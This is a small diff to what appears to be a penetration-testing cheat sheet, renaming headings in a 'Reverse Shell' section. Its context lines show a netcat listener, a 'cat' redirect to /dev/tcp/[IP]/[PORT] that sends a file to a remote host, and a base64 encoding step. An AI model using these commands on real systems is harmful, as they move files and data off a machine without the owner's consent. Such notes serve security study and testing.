@@ -24,8 +24,7 @@ nc -nvlp [PORT] > [OUTPUT FILE]
 cat [FILE NAME] > /dev/tcp/[IP]/[PORT]
 ```
 ## Reverse Shell
-### Source Machine
-#### Copy Content
+### Source Machine (Copy Result)
 ```
 cat [FILE] | base64 -w 0; echo
 ```
